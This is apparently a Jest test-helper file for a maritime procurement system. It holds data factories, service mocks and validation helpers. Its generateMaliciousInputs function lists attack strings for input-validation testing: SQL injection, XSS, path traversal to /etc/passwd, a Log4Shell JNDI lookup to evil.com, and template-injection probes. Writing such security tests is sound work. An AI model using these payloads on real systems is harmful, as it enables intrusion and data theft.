import { PrismaClient } from '@prisma/client';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcrypt';
import { faker } from '@faker-js/faker';

const prisma = new PrismaClient();

// Test data generators
export function generateTestToken(user: any): string {
  return jwt.sign(
    {
      userId: user.id,
      email: user.email,
      role: user.role,
      vessels: user.vessels || [],
      permissions: user.permissions || [],
    },
    process.env.JWT_SECRET || 'test-secret',
    { expiresIn: '1h' }
  );
}

export async function createTestUser(userData: Partial<any> = {}): Promise<any> {
  const defaultUser = {
    email: faker.internet.email(),
    passwordHash: await bcrypt.hash('TestPassword123!', 12),
    firstName: faker.person.firstName(),
    lastName: faker.person.lastName(),
    role: 'VESSEL_CREW',
    isActive: true,
    emailVerified: true,
    failedLoginAttempts: 0,
  };

  const user = await prisma.user.create({
    data: { ...defaultUser, ...userData },
    include: {
      vessels: true,
      permissions: true,
    },
  });

  return user;
}

export async function createTestVessel(vesselData: Partial<any> = {}): Promise<any> {
  const defaultVessel = {
    name: faker.company.name() + ' Explorer',
    imoNumber: faker.string.numeric(7),
    vesselType: 'CONTAINER_SHIP',
    flag: 'PANAMA',
    engineType: 'MAN_B&W',
    cargoCapacity: faker.number.float({ min: 1000, max: 20000 }),
    fuelConsumption: faker.number.float({ min: 50, max: 300 }),
    crewComplement: faker.number.int({ min: 15, max: 25 }),
    currentLatitude: faker.location.latitude(),
    currentLongitude: faker.location.longitude(),
    positionUpdatedAt: new Date(),
  };

  const vessel = await prisma.vessel.create({
    data: { ...defaultVessel, ...vesselData },
    include: {
      assignments: true,
      certificates: true,
      specifications: true,
    },
  });

  return vessel;
}

export async function createTestVendor(vendorData: Partial<any> = {}): Promise<any> {
  const defaultVendor = {
    name: faker.company.name() + ' Marine Supplies',
    code: faker.string.alphanumeric(6).toUpperCase(),
    contactInfo: {
      email: faker.internet.email(),
      phone: faker.phone.number(),
      address: {
        street: faker.location.streetAddress(),
        city: faker.location.city(),
        country: faker.location.country(),
        postalCode: faker.location.zipCode(),
      },
    },
    serviceAreas: ['EUROPE', 'NORTH_AMERICA'],
    paymentTerms: 'Net 30',
    creditLimit: faker.number.float({ min: 10000, max: 100000 }),
    qualityRating: faker.number.float({ min: 3.0, max: 5.0 }),
    deliveryRating: faker.number.float({ min: 3.0, max: 5.0 }),
    priceRating: faker.number.float({ min: 3.0, max: 5.0 }),
    overallScore: faker.number.float({ min: 3.0, max: 5.0 }),
    isActive: true,
  };

  const vendor = await prisma.vendor.create({
    data: { ...defaultVendor, ...vendorData },
    include: {
      portCapabilities: true,
      certifications: true,
    },
  });

  return vendor;
}

export async function createTestRequisition(requisitionData: Partial<any> = {}): Promise<any> {
  const defaultRequisition = {
    requisitionNumber: 'REQ-' + faker.string.alphanumeric(6).toUpperCase(),
    urgencyLevel: 'ROUTINE',
    status: 'DRAFT',
    totalAmount: faker.number.float({ min: 1000, max: 50000 }),
    currency: 'USD',
    deliveryLocation: faker.location.city(),
    deliveryDate: faker.date.future(),
    justification: faker.lorem.sentence(),
  };

  const requisition = await prisma.requisition.create({
    data: { ...defaultRequisition, ...requisitionData },
    include: {
      items: true,
      approvals: true,
      vessel: true,
      requestedBy: true,
    },
  });

  return requisition;
}

export async function createTestQuote(quoteData: Partial<any> = {}): Promise<any> {
  const defaultQuote = {
    totalAmount: faker.number.float({ min: 1000, max: 50000 }),
    currency: 'USD',
    validUntil: faker.date.future(),
    deliveryTime: faker.number.int({ min: 3, max: 30 }),
    paymentTerms: 'Net 30',
    status: 'RECEIVED',
  };

  const quote = await prisma.quote.create({
    data: { ...defaultQuote, ...quoteData },
    include: {
      lineItems: true,
      vendor: true,
      rfq: true,
    },
  });

  return quote;
}

export async function createTestPurchaseOrder(poData: Partial<any> = {}): Promise<any> {
  const defaultPO = {
    poNumber: 'PO-' + faker.string.alphanumeric(6).toUpperCase(),
    totalAmount: faker.number.float({ min: 1000, max: 50000 }),
    currency: 'USD',
    status: 'PENDING_APPROVAL',
    paymentTerms: 'Net 30',
    requestedDeliveryDate: faker.date.future(),
  };

  const po = await prisma.purchaseOrder.create({
    data: { ...defaultPO, ...poData },
    include: {
      items: true,
      vendor: true,
      vessel: true,
      deliveries: true,
    },
  });

  return po;
}

// Test database utilities
export async function cleanupTestData(): Promise<void> {
  const tables = [
    'auditLog',
    'refreshToken',
    'deliveryConfirmation',
    'delivery',
    'invoice',
    'purchaseOrder',
    'quoteLineItem',
    'quote',
    'vendorRFQ',
    'rFQ',
    'requisitionItem',
    'approval',
    'requisition',
    'vesselCertificate',
    'vesselSpecification',
    'vesselAssignment',
    'vendor',
    'vessel',
    'userPermission',
    'user',
  ];

  for (const table of tables) {
    try {
      await prisma.$executeRawUnsafe(`DELETE FROM "${table}"`);
    } catch (error) {
      console.warn(`Failed to clean table ${table}:`, error.message);
    }
  }
}

export async function seedTestDatabase(): Promise<void> {
  // Create test permissions
  const permissions = [
    'CREATE_REQUISITION',
    'APPROVE_REQUISITION',
    'MANAGE_VENDORS',
    'CREATE_RFQ',
    'APPROVE_QUOTES',
    'CREATE_PURCHASE_ORDER',
    'APPROVE_PURCHASE_ORDER',
    'MANAGE_DELIVERIES',
    'EMERGENCY_OVERRIDE',
    'VESSEL_ACCESS',
    'FINANCIAL_OPERATIONS',
  ];

  for (const permission of permissions) {
    await prisma.permission.upsert({
      where: { name: permission },
      update: {},
      create: {
        name: permission,
        description: `Permission to ${permission.toLowerCase().replace(/_/g, ' ')}`,
      },
    });
  }

  // Create test item catalog
  const itemCategories = [
    'ENGINE_PARTS',
    'DECK_EQUIPMENT',
    'SAFETY_GEAR',
    'NAVIGATION_EQUIPMENT',
    'CATERING_SUPPLIES',
    'MAINTENANCE_TOOLS',
  ];

  for (const category of itemCategories) {
    for (let i = 0; i < 10; i++) {
      await prisma.itemCatalog.create({
        data: {
          impaCode: faker.string.numeric(6),
          issaCode: faker.string.numeric(8),
          name: faker.commerce.productName(),
          description: faker.commerce.productDescription(),
          category: category as any,
          criticalityLevel: faker.helpers.arrayElement(['SAFETY_CRITICAL', 'OPERATIONAL_CRITICAL', 'ROUTINE']),
          unitOfMeasure: faker.helpers.arrayElement(['EA', 'KG', 'L', 'M', 'SET']),
          averagePrice: faker.number.float({ min: 10, max: 5000 }),
          leadTime: faker.number.int({ min: 1, max: 30 }),
        },
      });
    }
  }
}

// Mock external services
export function mockEmailService() {
  return {
    sendRFQNotification: jest.fn().mockResolvedValue({ success: true, messageId: 'test-message' }),
    sendApprovalNotification: jest.fn().mockResolvedValue({ success: true, messageId: 'test-message' }),
    sendDeliveryNotification: jest.fn().mockResolvedValue({ success: true, messageId: 'test-message' }),
    sendEmergencyNotification: jest.fn().mockResolvedValue({ success: true, messageId: 'test-message' }),
  };
}

export function mockExchangeRateService() {
  return {
    getCurrentRate: jest.fn().mockResolvedValue(1.0),
    getHistoricalRate: jest.fn().mockResolvedValue(1.0),
    getSupportedCurrencies: jest.fn().mockResolvedValue(['USD', 'EUR', 'GBP']),
  };
}

export function mockPortDatabaseService() {
  return {
    findNearestPorts: jest.fn().mockResolvedValue([
      {
        code: 'DEHAM',
        name: 'Hamburg',
        coordinates: { latitude: 53.5511, longitude: 9.9937 },
        services: ['DELIVERY', 'CUSTOMS', 'WAREHOUSING'],
      },
    ]),
    getPortDetails: jest.fn().mockResolvedValue({
      code: 'DEHAM',
      name: 'Hamburg',
      coordinates: { latitude: 53.5511, longitude: 9.9937 },
      services: ['DELIVERY', 'CUSTOMS', 'WAREHOUSING'],
      operatingHours: '24/7',
      contactInfo: { phone: '+49-40-123456', email: 'port@hamburg.de' },
    }),
  };
}

export function mockAISService() {
  return {
    getVesselPosition: jest.fn().mockResolvedValue({
      latitude: 53.5511,
      longitude: 9.9937,
      course: 180,
      speed: 12.5,
      timestamp: new Date(),
    }),
    trackVessel: jest.fn().mockResolvedValue({
      imoNumber: '1234567',
      positions: [
        { latitude: 53.5511, longitude: 9.9937, timestamp: new Date() },
      ],
    }),
  };
}

// Test assertion helpers
export function expectValidRequisition(requisition: any): void {
  expect(requisition).toBeDefined();
  expect(requisition.id).toBeDefined();
  expect(requisition.requisitionNumber).toMatch(/^REQ-/);
  expect(requisition.vesselId).toBeDefined();
  expect(requisition.requestedById).toBeDefined();
  expect(['ROUTINE', 'URGENT', 'EMERGENCY']).toContain(requisition.urgencyLevel);
  expect(['DRAFT', 'SUBMITTED', 'APPROVED', 'REJECTED']).toContain(requisition.status);
}

export function expectValidVendor(vendor: any): void {
  expect(vendor).toBeDefined();
  expect(vendor.id).toBeDefined();
  expect(vendor.name).toBeDefined();
  expect(vendor.code).toBeDefined();
  expect(vendor.contactInfo).toBeDefined();
  expect(vendor.serviceAreas).toBeInstanceOf(Array);
  expect(vendor.isActive).toBeDefined();
}

export function expectValidPurchaseOrder(po: any): void {
  expect(po).toBeDefined();
  expect(po.id).toBeDefined();
  expect(po.poNumber).toMatch(/^PO-/);
  expect(po.vendorId).toBeDefined();
  expect(po.vesselId).toBeDefined();
  expect(po.totalAmount).toBeGreaterThan(0);
  expect(po.currency).toBeDefined();
  expect(['PENDING_APPROVAL', 'APPROVED', 'REJECTED', 'DELIVERED']).toContain(po.status);
}

export function expectValidAuditLog(auditLog: any): void {
  expect(auditLog).toBeDefined();
  expect(auditLog.id).toBeDefined();
  expect(auditLog.userId).toBeDefined();
  expect(auditLog.action).toBeDefined();
  expect(auditLog.resourceType).toBeDefined();
  expect(auditLog.timestamp).toBeInstanceOf(Date);
}

// Performance testing helpers
export async function measureExecutionTime<T>(fn: () => Promise<T>): Promise<{ result: T; duration: number }> {
  const startTime = Date.now();
  const result = await fn();
  const duration = Date.now() - startTime;
  return { result, duration };
}

export function generateLoadTestData(count: number): any[] {
  return Array.from({ length: count }, () => ({
    id: faker.string.uuid(),
    name: faker.commerce.productName(),
    amount: faker.number.float({ min: 100, max: 10000 }),
    timestamp: faker.date.recent(),
  }));
}

// Security testing helpers
export function generateMaliciousInputs(): string[] {
  return [
    "'; DROP TABLE users; --",
    '<script>alert("XSS")</script>',
    '../../etc/passwd',
    '${jndi:ldap://evil.com/a}',
    'admin\' OR \'1\'=\'1',
    '<img src=x onerror=alert(1)>',
    '{{7*7}}',
    '${7*7}',
    '#{7*7}',
    '%{7*7}',
  ];
}

export function generateValidationTestCases(): Array<{ input: any; shouldPass: boolean; description: string }> {
  return [
    { input: 'valid@email.com', shouldPass: true, description: 'Valid email' },
    { input: 'invalid-email', shouldPass: false, description: 'Invalid email format' },
    { input: 'StrongP@ssw0rd123!', shouldPass: true, description: 'Strong password' },
    { input: 'weak', shouldPass: false, description: 'Weak password' },
    { input: '1234567', shouldPass: true, description: 'Valid IMO number' },
    { input: '123', shouldPass: false, description: 'Invalid IMO number' },
    { input: 1000.50, shouldPass: true, description: 'Valid amount' },
    { input: -100, shouldPass: false, description: 'Negative amount' },
  ];
}

// Maritime-specific test helpers
export function generateVesselPositions(count: number): Array<{ latitude: number; longitude: number; timestamp: Date }> {
  return Array.from({ length: count }, () => ({
    latitude: faker.location.latitude({ min: -90, max: 90 }),
    longitude: faker.location.longitude({ min: -180, max: 180 }),
    timestamp: faker.date.recent(),
  }));
}

export function generateMaritimeEmergencyScenarios(): Array<{
  type: string;
  severity: string;
  description: string;
  requiredActions: string[];
}> {
  return [
    {
      type: 'ENGINE_FAILURE',
      severity: 'CRITICAL',
      description: 'Main engine bearing failure',
      requiredActions: ['EMERGENCY_REQUISITION', 'CAPTAIN_OVERRIDE', 'IMMEDIATE_PROCUREMENT'],
    },
    {
      type: 'FIRE',
      severity: 'HIGH',
      description: 'Engine room fire',
      requiredActions: ['FIRE_SUPPRESSION', 'EMERGENCY_SUPPLIES', 'PORT_COORDINATION'],
    },
    {
      type: 'COLLISION',
      severity: 'MEDIUM',
      description: 'Minor collision damage',
      requiredActions: ['DAMAGE_ASSESSMENT', 'REPAIR_MATERIALS', 'SURVEY_REQUIRED'],
    },
    {
      type: 'MEDICAL',
      severity: 'HIGH',
      description: 'Crew medical emergency',
      requiredActions: ['MEDICAL_EVACUATION', 'MEDICAL_SUPPLIES', 'COAST_GUARD_COORDINATION'],
    },
  ];
}

export default {
  generateTestToken,
  createTestUser,
  createTestVessel,
  createTestVendor,
  createTestRequisition,
  createTestQuote,
  createTestPurchaseOrder,
  cleanupTestData,
  seedTestDatabase,
  mockEmailService,
  mockExchangeRateService,
  mockPortDatabaseService,
  mockAISService,
  expectValidRequisition,
  expectValidVendor,
  expectValidPurchaseOrder,
  expectValidAuditLog,
  measureExecutionTime,
  generateLoadTestData,
  generateMaliciousInputs,
  generateValidationTestCases,
  generateVesselPositions,
  generateMaritimeEmergencyScenarios,
};